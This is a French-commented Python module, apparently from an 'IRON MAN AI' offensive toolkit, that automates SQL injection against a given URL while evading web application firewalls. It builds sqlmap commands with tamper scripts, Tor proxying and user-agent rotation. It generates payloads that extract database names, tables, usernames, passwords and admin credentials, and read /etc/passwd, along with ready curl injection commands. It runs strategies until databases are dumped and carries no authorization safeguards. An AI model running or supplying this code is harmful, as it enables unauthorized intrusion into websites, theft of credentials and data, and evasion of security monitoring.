"""
IRON MAN AI — WAF Bypass Module

Techniques avancées pour contourner les WAF (Web Application Firewall) :
1. Tamper scripts sqlmap (space2comment, between, randomcase…)
2. Tor proxy (anonymisation)
3. Techniques manuelles (POST, cookies, headers custom)
4. Rotation User-Agent
5. Fragmentation de payload
6. Délai adaptatif

Usage :
    from kali.waf_bypass import WafBypasser
    bypasser = WafBypasser()
    cmd = bypasser.build_sqlmap_cmd(url, mode="aggressive")
"""

import os
import random
import time
import subprocess
from typing import List, Optional, Dict
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


# ─── Tamper scripts sqlmap par catégorie ─────────────────────────────────────
TAMPER_SETS = {
    # Contournement basique (espace, casse, commentaires)
    "basic": [
        "space2comment",
        "randomcase",
        "between",
        "equaltolike",
        "greatest",
    ],
    # Encodage (URL, double, Unicode)
    "encoding": [
        "charencode",
        "charunicodeencode",
        "urlencode",
    ],
    # SQL spécifique
    "sql": [
        "space2comment",
        "between",
        "greatest",
        "equaltolike",
        "halfversionedmorekeywords",
    ],
    # Combiné (le plus puissant)
    "aggressive": [
        "space2comment,randomcase,between,equaltolike,greatest",
        "charencode,randomcase,space2comment",
        "between,randomcase,greatest,equaltolike",
    ],
    # WAF Cloudflare / Incapsula / ModSecurity
    "cloudflare": [
        "between,randomcase,space2comment",
        "charencode,between,space2comment",
        "between,equaltolike,greatest,space2comment",
    ],
}

# ─── User-Agents réalistes ──────────────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
]


class WafBypasser:
    """Contournement automatique de WAF pour sqlmap et autres outils."""

    def __init__(self, use_tor: bool = False, verbose: bool = False):
        self.use_tor = use_tor
        self.verbose = verbose
        self._tor_ok = None
        if use_tor:
            self._tor_ok = self._check_tor()

    def _check_tor(self) -> bool:
        """Vérifie si Tor est installé et fonctionnel."""
        try:
            result = subprocess.run(
                ["tor", "--version"],
                capture_output=True, timeout=10
            )
            if result.returncode == 0:
                # Vérifier si Tor tourne déjà
                try:
                    subprocess.run(
                        ["pgrep", "tor"],
                        capture_output=True, timeout=5
                    )
                    return True
                except Exception:
                    return True  # installé mais pas lancé
        except Exception:
            pass
        return False

    def start_tor(self) -> bool:
        """Lance Tor si pas déjà lancé."""
        if not self._tor_ok:
            return False
        try:
            # Vérifier si déjà lancé
            result = subprocess.run(
                ["pgrep", "tor"],
                capture_output=True, timeout=5
            )
            if result.returncode == 0:
                return True
            # Lancer Tor en arrière-plan
            subprocess.Popen(
                ["tor", "--RunAsDaemon", "1"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            time.sleep(5)  # attendre que Tor se connecte
            return True
        except Exception:
            return False

    def get_tor_socks_proxy(self) -> str:
        """Retourne le proxy SOCKS5 Tor."""
        return "socks5://127.0.0.1:9050"

    def build_sqlmap_cmd(
        self,
        url: str,
        mode: str = "aggressive",
        tamper_set: str = "basic",
        extra_args: Optional[List[str]] = None,
        output_dir: str = "",
    ) -> List[str]:
        """
        Construit une commande sqlmap avec WAF bypass.

        Modes :
        - "basic" : tamper scripts + random-agent
        - "aggressive" : tamper + Tor + delay adaptatif + level 5
        - "stealth" : Tor + delay long + tamper + 1 thread
        - "post" : force le mode POST
        """
        cmd = ["sqlmap", "-u", url, "--batch"]

        # Tamper scripts
        tampers = TAMPER_SETS.get(tamper_set, TAMPER_SETS["basic"])
        if isinstance(tampers, list):
            tamper_str = tampers[0]  # prendre la première combinaison
        else:
            tamper_str = tampers
        cmd.extend(["--tamper", tamper_str])

        # Random User-Agent
        cmd.extend(["--random-agent"])

        # Tor proxy
        if self.use_tor and self._tor_ok:
            cmd.extend(["--proxy", self.get_tor_socks_proxy()])

        if mode == "basic":
            cmd.extend([
                "--dbs",
                "--threads", "2",
                "--timeout", "30",
                "--retries", "3",
                "--level", "3",
                "--risk", "2",
            ])

        elif mode == "aggressive":
            cmd.extend([
                "--dbs",
                "--threads", "2",
                "--timeout", "90",
                "--retries", "5",
                "--level", "5",
                "--risk", "3",
                "--technique", "BEUST",
                "--delay", "0.3",
                "--time-sec", "10",
            ])

        elif mode == "stealth":
            cmd.extend([
                "--dbs",
                "--threads", "1",
                "--timeout", "120",
                "--retries", "5",
                "--level", "5",
                "--risk", "3",
                "--technique", "S",
                "--delay", "2",
                "--time-sec", "30",
            ])

        elif mode == "post":
            cmd.extend([
                "--method", "POST",
                "--data", "id=1",
                "--dbs",
                "--threads", "2",
                "--timeout", "60",
                "--level", "5",
                "--risk", "2",
            ])

        # Flush session pour repartir de zéro
        cmd.extend(["--flush-session", "--fresh-queries"])

        if output_dir:
            cmd.extend(["--output-dir", output_dir])

        if extra_args:
            cmd.extend(extra_args)

        return cmd

    def build_multi_tamper_cmds(
        self,
        url: str,
        output_dir: str = "",
    ) -> List[Dict]:
        """
        Construit PLUSIEURS commandes sqlmap avec différents tamper sets
        pour maximiser les chances de contourner le WAF.
        """
        cmds = []

        # Stratégie 1 : basic tamper
        cmds.append({
            "name": "sqlmap-basic-tamper",
            "description": "Tamper de base (space2comment + randomcase)",
            "cmd": self.build_sqlmap_cmd(url, mode="basic", tamper_set="basic", output_dir=output_dir),
            "timeout": 180,
        })

        # Stratégie 2 : aggressive tamper
        cmds.append({
            "name": "sqlmap-aggressive-tamper",
            "description": "Tamper agressif (combinaison forte)",
            "cmd": self.build_sqlmap_cmd(url, mode="aggressive", tamper_set="aggressive", output_dir=output_dir),
            "timeout": 300,
        })

        # Stratégie 3 : encoding tamper
        cmds.append({
            "name": "sqlmap-encoding-tamper",
            "description": "Encodage (charencode + urlencode)",
            "cmd": self.build_sqlmap_cmd(url, mode="aggressive", tamper_set="encoding", output_dir=output_dir),
            "timeout": 300,
        })

        # Stratégie 4 : SQL tamper
        cmds.append({
            "name": "sqlmap-sql-tamper",
            "description": "SQL spécifique (halfversionedmorekeywords)",
            "cmd": self.build_sqlmap_cmd(url, mode="aggressive", tamper_set="sql", output_dir=output_dir),
            "timeout": 300,
        })

        # Stratégie 5 : stealth (Tor + delay long)
        if self.use_tor and self._tor_ok:
            cmds.append({
                "name": "sqlmap-stealth",
                "description": "Mode furtif (Tor + delay 2s + 1 thread)",
                "cmd": self.build_sqlmap_cmd(url, mode="stealth", tamper_set="aggressive", output_dir=output_dir),
                "timeout": 600,
            })

        return cmds

    def extract_injectable_param(self, url: str) -> Optional[str]:
        """
        Analyse l'URL pour trouver le paramètre injectable.
        Retourne le nom du paramètre ou None.
        """
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if params:
            return list(params.keys())[0]
        return None

    def build_manual_payloads(
        self,
        base_url: str,
        param: str,
    ) -> List[Dict]:
        """
        Génère des payloads SQL manuels pour injection directe
        dans un navigateur ou curl.
        """
        parsed = urlparse(base_url)
        params = parse_qs(parsed.query)

        payloads = []

        # 1. UNION SELECT (le plus classique)
        payloads.append({
            "technique": "UNION SELECT",
            "payload": f"{param}=1 UNION SELECT 1,2,3,4,5--",
            "description": "Injecte UNION SELECT pour afficher les colonnes",
            "usage": f"Ouvrir dans le navigateur : ?{param}=1 UNION SELECT 1,2,3,4,5--",
        })

        # 2. OR-based injection
        payloads.append({
            "technique": "OR 1=1",
            "payload": f"{param}=1' OR '1'='1",
            "description": "Teste si l'injection OR fonctionne",
            "usage": f"Tester : ?{param}=1' OR '1'='1",
        })

        # 3. Union pour extraire les noms de bases
        payloads.append({
            "technique": "UNION → Database names",
            "payload": f"{param}=1 UNION SELECT GROUP_CONCAT(schema_name),2,3,4,5 FROM information_schema.schemata--",
            "description": "Extrait tous les noms de bases de données",
            "usage": "Exécuter via sqlmap ou curl",
        })

        # 4. Union pour extraire les tables
        payloads.append({
            "technique": "UNION → Table names",
            "payload": f"{param}=1 UNION SELECT GROUP_CONCAT(table_name),2,3,4,5 FROM information_schema.tables WHERE table_schema=DATABASE()--",
            "description": "Extrait tous les noms de tables de la base actuelle",
        })

        # 5. Union pour extraire users/passwords
        payloads.append({
            "technique": "UNION → Users + passwords",
            "payload": f"{param}=1 UNION SELECT GROUP_CONCAT(username,0x3a,password),2,3,4,5 FROM users--",
            "description": "Extrait les identifiants et mots de passe de la table users",
        })

        # 6. UNION pour extraire admin
        payloads.append({
            "technique": "UNION → Admin credentials",
            "payload": f"{param}=1 UNION SELECT GROUP_CONCAT(login,0x3a,secret,0x3a,password),2,3,4,5 FROM admin--",
            "description": "Extrait les identifiants admin",
        })

        # 7. Time-based blind
        payloads.append({
            "technique": "Time-based blind",
            "payload": f"{param}=1' AND IF(SUBSTRING(version(),1,1)='8',SLEEP(5),0)--",
            "description": "Teste la version MySQL via delay",
        })

        # 8. Error-based injection
        payloads.append({
            "technique": "Error-based",
            "payload": f"{param}=1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
            "description": "Extrait la version via erreur XML",
        })

        # 9. List ALL data
        payloads.append({
            "technique": "UNION → ALL DATA",
            "payload": f"{param}=1 UNION SELECT GROUP_CONCAT(table_name,0x3a,column_name,0x3a,data_type SEPARATOR '\\n'),2,3,4,5 FROM information_schema.columns WHERE table_schema=DATABASE()--",
            "description": "Extrait TOUTES les tables + colonnes de la base",
        })

        # 10. OS shell (si possible)
        payloads.append({
            "technique": "OS Shell",
            "payload": f"{param}=1' UNION SELECT 1,2,LOAD_FILE('/etc/passwd'),4,5--",
            "description": "Tente de lire /etc/passwd (si LOAD_FILE autorisé)",
        })

        return payloads

    def build_curl_cmds(
        self,
        base_url: str,
        param: str,
    ) -> List[Dict]:
        """
        Génère des commandes curl pour injection manuelle
        avec headers réalistes et bypass basique.
        """
        ua = random.choice(USER_AGENTS)
        cmds = []

        # Test basique avec header réaliste
        payload = f"1' OR '1'='1"
        url_test = f"{base_url}?{param}={payload}"
        cmds.append({
            "name": "curl-or-test",
            "cmd": (
                f"curl -s -o /dev/null -w '%{{http_code}}' "
                f"-H 'User-Agent: {ua}' "
                f"-H 'Accept: text/html' "
                f"-H 'Accept-Language: fr-FR,fr;q=0.9' "
                f"'{url_test}'"
            ),
            "description": "Test injection OR avec headers réalistes",
        })

        # Injection via POST
        cmds.append({
            "name": "curl-post-inject",
            "cmd": (
                f"curl -s -X POST '{base_url}' "
                f"-H 'User-Agent: {ua}' "
                f"-H 'Content-Type: application/x-www-form-urlencoded' "
                f"-d '{param}=1%27%20OR%20%271%27%3D%271'"
            ),
            "description": "Injection via POST avec encodage URL",
        })

        # Enum databases via UNION
        cmds.append({
            "name": "curl-enum-dbs",
            "cmd": (
                f"curl -s '{base_url}?{param}=1%20UNION%20SELECT%20GROUP_CONCAT(schema_name)%2C2%2C3%2C4%2C5%20FROM%20information_schema.schemata--' "
                f"-H 'User-Agent: {ua}' "
                f"-H 'Accept: text/html'"
            ),
            "description": "Enumère les bases de données via UNION",
        })

        return cmds


def quick_bypass_sqlmap(
    url: str,
    tmp_dir: str = "/tmp/ironman_bypass",
    verbose: bool = True,
) -> List[Dict]:
    """
    Exécution rapide : essaie tous les tamper sets jusqu'à trouver
    une injection qui fonctionne.
    """
    os.makedirs(tmp_dir, exist_ok=True)
    bypasser = WafBypasser(use_tor=False, verbose=verbose)

    results = []
    param = bypasser.extract_injectable_param(url)

    if not param:
        if verbose:
            print("  [WAF-BYPASS] Aucun paramètre trouvé dans l'URL")
        return results

    cmds = bypasser.build_multi_tamper_cmds(url, output_dir=tmp_dir)

    for strategy in cmds:
        if verbose:
            print(f"  [WAF-BYPASS] Essai : {strategy['description']}")
            print(f"    → Tamper : {strategy['cmd']}")

        start = time.monotonic()
        try:
            proc = subprocess.run(
                strategy["cmd"],
                capture_output=True,
                text=True,
                timeout=strategy["timeout"],
                cwd=tmp_dir,
            )
            output = proc.stdout + proc.stderr
            duration = time.monotonic() - start

            # Analyser la sortie
            found = False
            dbs = []
            injectable = False

            if "is vulnerable" in output.lower() or "injectable" in output.lower():
                injectable = True
            if "available databases" in output.lower():
                for line in output.splitlines():
                    if line.strip().startswith("[*]"):
                        db = line.strip().lstrip("[*] ").strip()
                        if db and db not in ("information_schema", "mysql", "performance_schema", "sys"):
                            dbs.append(db)
                found = True

            results.append({
                "strategy": strategy["name"],
                "description": strategy["description"],
                "success": found,
                "injectable": injectable,
                "databases": dbs,
                "duration": round(duration, 1),
                "output_tail": output[-500:] if output else "",
            })

            if found:
                if verbose:
                    print(f"    ✅ SUCCÈS ! Bases trouvées : {', '.join(dbs)}")
                break  # on arrête dès qu'on trouve
            elif injectable:
                if verbose:
                    print(f"    ⚠️ Injection confirmée mais BDD non listée")
            else:
                if verbose:
                    print(f"    ❌ Pas d'injection ({round(duration, 1)}s)")

        except subprocess.TimeoutExpired:
            if verbose:
                print(f"    ⏰ Timeout ({strategy['timeout']}s)")
        except Exception as e:
            if verbose:
                print(f"    ❌ Erreur : {e}")

    return results


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python waf_bypass.py <URL>")
        print("Exemple: python waf_bypass.py 'https://example.com/?id=1'")
        sys.exit(1)

    url = sys.argv[1]
    print(f"\n{'='*60}")
    print(f"  IRON MAN AI — WAF Bypass pour : {url}")
    print(f"{'='*60}\n")

    results = quick_bypass_sqlmap(url, verbose=True)

    print(f"\n{'='*60}")
    print(f"  RÉSULTATS : {len(results)} stratégies testées")
    successes = [r for r in results if r["success"]]
    print(f"  SUCCÈS : {len(successes)}/{len(results)}")
    if successes:
        for s in successes:
            print(f"    ✅ {s['strategy']} → BDD : {', '.join(s['databases'])}")
    print(f"{'='*60}")
